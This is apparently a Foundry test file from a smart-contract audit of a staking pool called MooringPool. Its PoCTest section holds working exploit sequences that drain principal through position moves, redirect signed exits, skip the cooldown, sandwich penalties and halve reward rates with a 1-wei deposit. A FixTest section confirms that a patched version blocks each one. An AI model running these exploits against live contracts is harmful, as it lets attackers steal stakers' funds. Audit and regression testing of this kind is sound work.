// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MooringPool, IERC20Lite} from "../src/MooringPool.sol";
import {MooringPoolFixed} from "../solution/MooringPoolFixed.sol";

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address s, uint256 amount) external returns (bool) {
        allowance[msg.sender][s] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev 漏洞版和修复版共用的接口。
interface IPool {
    function stake(uint256) external;
    function requestExit(uint256) external;
    function completeExit() external;
    function completeExitBySig(address, address, uint256, uint8, bytes32, bytes32) external;
    function instantExit(uint256) external;
    function movePosition(address, uint256) external;
    function claim() external;
    function notifyReward(uint256) external;
    function domainSeparator() external view returns (bytes32);
    function rewardRate() external view returns (uint256);
    function periodEnd() external view returns (uint256);
    function nonces(address) external view returns (uint256);
}

abstract contract Base is Test {
    Token st = new Token();
    Token rw = new Token();
    IPool pool;

    uint256 alicePk = 0xA11CE;
    address alice = vm.addr(alicePk);
    address bob = makeAddr("bob");
    address mallory = makeAddr("mallory");
    address mallory2 = makeAddr("mallory2");
    address sponsor = makeAddr("sponsor");
    address relayer = makeAddr("relayer");

    uint256 constant E = 1e18;

    function setPool(address p) internal {
        pool = IPool(p);
        address[4] memory users = [alice, bob, mallory, mallory2];
        for (uint256 i; i < users.length; i++) {
            st.mint(users[i], 100_000 * E);
            vm.prank(users[i]);
            st.approve(p, type(uint256).max);
        }
        rw.mint(sponsor, 1_000_000 * E);
        vm.prank(sponsor);
        rw.approve(p, type(uint256).max);
    }

    function stakeAs(address u, uint256 a) internal {
        vm.prank(u);
        pool.stake(a);
    }

    function notify(uint256 a) internal {
        vm.prank(sponsor);
        pool.notifyReward(a);
    }

    function signExit(address receiverIgnoredOrBound, uint256 deadline) internal view returns (uint8, bytes32, bytes32) {
        bytes32 typeHash = keccak256("CompleteExit(address owner,uint256 nonce,uint256 deadline)");
        bytes32 structHash = keccak256(abi.encode(typeHash, alice, pool.nonces(alice), deadline));
        receiverIgnoredOrBound;
        return vm.sign(alicePk, keccak256(abi.encodePacked("\x19\x01", pool.domainSeparator(), structHash)));
    }

    function signExitBound(address receiver, uint256 deadline) internal view returns (uint8, bytes32, bytes32) {
        bytes32 typeHash = keccak256("CompleteExit(address owner,address receiver,uint256 nonce,uint256 deadline)");
        bytes32 structHash = keccak256(abi.encode(typeHash, alice, receiver, pool.nonces(alice), deadline));
        return vm.sign(alicePk, keccak256(abi.encodePacked("\x19\x01", pool.domainSeparator(), structHash)));
    }
}

contract PoCTest is Base {
    function setUp() public {
        setPool(address(new MooringPool(IERC20Lite(address(st)), IERC20Lite(address(rw)), address(this))));
    }

    // ---------- 失败的假设：这些攻击不成立 ----------

    function test_Rejected_FlashStakeEarnsNoStreamReward() public {
        stakeAs(alice, 1_000 * E);
        notify(30_000 * E);
        vm.warp(block.timestamp + 1 days);
        vm.prank(alice);
        pool.claim(); // 结清前一天的奖励，全部归 Alice
        stakeAs(mallory, 90_000 * E);
        vm.prank(mallory);
        pool.claim();
        assertEq(rw.balanceOf(mallory), 0, "same-block stake earns nothing");
    }

    function test_Rejected_HighSSignatureCannotReplay() public {
        stakeAs(alice, 1_000 * E);
        vm.startPrank(alice);
        pool.requestExit(1_000 * E);
        vm.stopPrank();
        vm.warp(block.timestamp + 7 days);
        uint256 dl = block.timestamp + 1 hours;
        (uint8 v, bytes32 r, bytes32 s) = signExit(alice, dl);
        pool.completeExitBySig(alice, alice, dl, v, r, s);

        bytes32 N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        bytes32 flipped = bytes32(uint256(N) - uint256(s));
        uint8 flippedV = v == 27 ? 28 : 27;
        vm.expectRevert(bytes("bad signature"));
        pool.completeExitBySig(alice, alice, dl, flippedV, r, flipped);
    }

    // ---------- 成立的发现 ----------

    function test_TA1_MovedPositionDrainsPrincipal() public {
        stakeAs(alice, 1_000 * E);
        stakeAs(bob, 9_000 * E);
        vm.prank(bob);
        pool.instantExit(1_000 * E); // 罚金 100，累积到每份额

        uint256 before_ = st.balanceOf(mallory) + st.balanceOf(mallory2);
        stakeAs(mallory, 40_000 * E);
        vm.prank(mallory);
        pool.movePosition(mallory2, 40_000 * E);
        vm.prank(mallory2);
        pool.claim();
        uint256 profit = st.balanceOf(mallory) + st.balanceOf(mallory2) + 40_000 * E - before_;
        console2.log("mallory stake-token profit (wei):", profit);
        assertGt(profit, 0);
        assertGt(st.balanceOf(mallory2), 100_000 * E + 100 * E, "more than the total penalty ever paid");
    }

    function test_TA1_MovedPositionOverpaysReward() public {
        stakeAs(alice, 1_000 * E);
        notify(30_000 * E);
        vm.warp(block.timestamp + 10 days);
        stakeAs(mallory, 1_000 * E);
        vm.prank(mallory);
        pool.movePosition(mallory2, 1_000 * E);
        vm.prank(mallory2);
        pool.claim();
        assertApproxEqRel(rw.balanceOf(mallory2), 10_000 * E, 1e15, "history rewards taken with no staking time");
    }

    function test_TA2_RelayerRedirectsSignedExit() public {
        stakeAs(alice, 1_000 * E);
        vm.prank(alice);
        pool.requestExit(1_000 * E);
        vm.warp(block.timestamp + 7 days);
        uint256 dl = block.timestamp + 1 hours;
        (uint8 v, bytes32 r, bytes32 s) = signExit(alice, dl);

        vm.prank(mallory);
        pool.completeExitBySig(alice, mallory, dl, v, r, s);
        assertEq(st.balanceOf(mallory), 101_000 * E);
        assertEq(st.balanceOf(alice), 99_000 * E);
    }

    function test_TA3_PreArmedCooldownSkipsDelay() public {
        stakeAs(mallory, 1);
        vm.prank(mallory);
        pool.requestExit(1); // 第 0 天：只排 1 wei
        vm.warp(block.timestamp + 8 days);

        stakeAs(mallory, 50_000 * E);
        vm.startPrank(mallory);
        pool.requestExit(50_000 * E);
        pool.completeExit(); // 同一区块取回全部金额
        vm.stopPrank();
        assertEq(st.balanceOf(mallory), 100_000 * E);
    }

    function test_TA3_ChainedPenaltySandwich() public {
        stakeAs(alice, 10_000 * E);
        stakeAs(bob, 10_000 * E);
        stakeAs(mallory, 1);
        vm.prank(mallory);
        pool.requestExit(1);
        vm.warp(block.timestamp + 8 days);

        // 抢跑：Bob 的 instantExit 已经进入内存池
        stakeAs(mallory, 90_000 * E);
        vm.prank(bob);
        pool.instantExit(10_000 * E); // 罚金 1,000
        // 尾随：领罚金，零等待退出
        vm.startPrank(mallory);
        pool.claim();
        pool.requestExit(90_000 * E);
        pool.completeExit();
        vm.stopPrank();

        uint256 gain = st.balanceOf(mallory) - 100_000 * E;
        console2.log("mallory penalty captured (wei):", gain);
        assertGt(gain, 899 * E, "about 90% of the penalty");
    }

    function test_TA4_LastStakerCannotInstantExit() public {
        stakeAs(alice, 1_000 * E);
        vm.prank(alice);
        vm.expectRevert(); // panic 0x12：除以零
        pool.instantExit(1_000 * E);
    }

    function test_TA4_CooldownRouteStillWorks() public {
        stakeAs(alice, 1_000 * E);
        vm.startPrank(alice);
        pool.requestExit(1_000 * E);
        vm.warp(block.timestamp + 7 days);
        pool.completeExit();
        vm.stopPrank();
        assertEq(st.balanceOf(alice), 100_000 * E, "funds were never frozen");
    }

    function test_TA5_DustNotifyCutsRate() public {
        stakeAs(alice, 1_000 * E);
        notify(30_000 * E);
        uint256 rate0 = pool.rewardRate();
        vm.warp(block.timestamp + 15 days);

        rw.mint(mallory, 1);
        vm.startPrank(mallory);
        rw.approve(address(pool), 1);
        pool.notifyReward(1);
        vm.stopPrank();

        console2.log("rate before:", rate0);
        console2.log("rate after :", pool.rewardRate());
        assertApproxEqRel(pool.rewardRate(), rate0 / 2, 1e15, "half the rate for 1 wei");
        assertEq(pool.periodEnd(), block.timestamp + 30 days);
    }
}

contract FixTest is Base {
    function setUp() public {
        setPool(address(new MooringPoolFixed(IERC20Lite(address(st)), IERC20Lite(address(rw)), address(this))));
    }

    function test_Fix_TA1_MoveCarriesDebt() public {
        stakeAs(alice, 1_000 * E);
        stakeAs(bob, 9_000 * E);
        vm.prank(bob);
        pool.instantExit(1_000 * E);
        stakeAs(mallory, 40_000 * E);
        vm.prank(mallory);
        pool.movePosition(mallory2, 40_000 * E);
        vm.prank(mallory2);
        pool.claim();
        assertEq(st.balanceOf(mallory2), 100_000 * E, "no credit from history");
    }

    function test_Fix_TA1_ReceiverKeepsOwnAccrual() public {
        stakeAs(alice, 1_000 * E);
        notify(30_000 * E);
        vm.warp(block.timestamp + 10 days);
        stakeAs(mallory, 1_000 * E);
        vm.prank(mallory);
        pool.movePosition(alice, 1_000 * E);
        vm.prank(alice);
        pool.claim();
        assertApproxEqRel(rw.balanceOf(alice), 10_000 * E, 1e15);
    }

    function test_Fix_TA2_ReceiverIsSigned() public {
        stakeAs(alice, 1_000 * E);
        vm.prank(alice);
        pool.requestExit(1_000 * E);
        vm.warp(block.timestamp + 7 days);
        uint256 dl = block.timestamp + 1 hours;
        (uint8 v, bytes32 r, bytes32 s) = signExitBound(alice, dl);

        vm.prank(mallory);
        vm.expectRevert(bytes("bad signature"));
        pool.completeExitBySig(alice, mallory, dl, v, r, s);

        vm.prank(relayer);
        pool.completeExitBySig(alice, alice, dl, v, r, s);
        assertEq(st.balanceOf(alice), 100_000 * E);
    }

    function test_Fix_TA3_TopUpRestartsCooldown() public {
        stakeAs(mallory, 1);
        vm.prank(mallory);
        pool.requestExit(1);
        vm.warp(block.timestamp + 8 days);
        stakeAs(mallory, 50_000 * E);
        vm.startPrank(mallory);
        pool.requestExit(50_000 * E);
        vm.expectRevert(bytes("cooling down"));
        pool.completeExit();
        vm.stopPrank();
    }

    function test_Fix_TA4_LastStakerExitsFree() public {
        stakeAs(alice, 1_000 * E);
        vm.prank(alice);
        pool.instantExit(1_000 * E);
        assertEq(st.balanceOf(alice), 100_000 * E);
    }

    function test_Fix_TA5_DustCannotCutRate() public {
        stakeAs(alice, 1_000 * E);
        notify(30_000 * E);
        vm.warp(block.timestamp + 15 days);
        rw.mint(mallory, 1);
        vm.startPrank(mallory);
        rw.approve(address(pool), 1);
        vm.expectRevert(bytes("rate would drop"));
        pool.notifyReward(1);
        vm.stopPrank();
    }
}
